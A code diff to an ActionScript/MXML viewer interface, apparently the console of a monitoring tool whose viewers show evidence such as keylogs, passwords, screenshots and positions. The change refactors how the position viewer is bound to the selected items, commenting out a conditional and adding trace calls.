@@ -78,14 +78,18 @@
           //TODO
           if(currentState=="position")
           {
-            if(currentItems.length>1 && sameType("position", currentItems))
+            positionViewer.evidences=currentItems;
+            /* if(currentItems.length>1 && sameType("position", currentItems))
               {
                 positionViewer.evidences=currentItems;
+                trace("condition true")
               }
               else
               {
-                positionViewer.evidence=currentItem
-              } 
+                positionViewer.evidences=currentItems;
+                positionViewer.evidence=currentItem;
+                trace("condition false")
+              }  */
           }
           if(currentState=="keylog")
           {
@@ -225,7 +229,7 @@
       private function sameType(type:String, selectedItems:Vector.<Object>):Boolean
       {
         var result:Boolean=true;
-        var value:String=selectedItems[0].type
+        var value:String=selectedItems[0].type;
         for (var i:int=0; i < selectedItems.length; i++)
         {
           
@@ -288,7 +292,7 @@
   <viewers:Mic evidence="{currentItem}" includeIn="mic" id="micViewer"/>
   <viewers:Mouse evidence="{currentItem}" includeIn="mouse" id="mouseViewer"/>
   <viewers:Password evidence="{currentItem}" includeIn="password" id="passwordViewer"/>
-  <viewers:Position evidences="{currentItems}" includeIn="position" id="positionViewer" change="onMapChange()"/>
+  <viewers:Position evidences="{currentItems}" includeIn="position" id="positionViewer" change="onMapChange()" evidence="{currentItem}"/>
   <viewers:Print evidence="{currentItem}" includeIn="print" id="printViewer"/>
   <viewers:Screenshot evidence="{currentItem}" includeIn="screenshot" id="screenshotViewer"/>
   <viewers:Url evidence="{currentItem}" includeIn="url" id="urlViewer"/>
